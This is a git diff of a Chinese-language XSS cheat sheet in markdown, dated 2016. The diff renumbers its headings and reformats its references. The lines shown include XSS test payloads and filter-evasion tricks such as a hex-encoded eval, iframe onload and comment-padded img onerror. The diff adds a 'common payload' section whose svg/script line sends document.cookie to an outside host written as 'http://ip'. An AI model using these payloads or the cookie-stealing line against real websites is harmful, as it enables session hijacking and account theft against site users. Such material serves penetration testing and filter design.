@@ -3,7 +3,7 @@ title: "XSS"
 date: 2016-01-20 21:38
 ---
 
-## xss cheat sheet
+## 0x01 xss cheat sheet
 
 xss cheat sheet 即测试xss的测试样表
 
@@ -20,7 +20,7 @@ xss cheat sheet 即测试xss的测试样表
 <iframe onload="alert(1)"></iframe>
 ```
 
-## xss 过滤绕过
+## 0x02 xss 过滤绕过
 
 * <> 
 
@@ -191,7 +191,7 @@ eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29");
 # eval 执行10进制形式，需要 String.fromCharCode() 配合使用
 ```
 
-## 常见绕过
+## 0x03 常见绕过
 
 ```
 # 大小写转换
@@ -206,7 +206,14 @@ eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29");
 <img/**/src="a"/**/onerror=alert(/xss/)>
 ```
 
-## 浏览器特性
+## 0x04 常用 xss payload
+
+```
+# <svg>
+<svg><script>location.href="http://ip/xss.php?q="+document.cookie</script></svg>
+```
+
+## 0x05 浏览器特性
 
 ### chrome
 
@@ -231,14 +238,19 @@ eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29");
 <iframe src="vbscript:msgbox(1)"></iframe> 
 ```
 
-## flash
+## 0x06 flash
 
 [swf反编译软件下载][4]
 
-[ 乌云 Flash Xss入门--navigateToURL][5]
-[ 乌云 Flash Xss进阶--ExternalInterface.call(1)][6]
-[ 乌云 Flash Xss进阶--ExternalInterface.call(2)][7]
-[ 乌云 Flash Xss进阶--addCallback][8]
+## 0x 参考
+
+* [ 乌云 Flash Xss入门--navigateToURL][5]
+
+* [ 乌云 Flash Xss进阶--ExternalInterface.call(1)][6]
+
+* [ 乌云 Flash Xss进阶--ExternalInterface.call(2)][7]
+
+* [ 乌云 Flash Xss进阶--addCallback][8]
 
 [1]: http://html5sec.org/
 [2]: https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
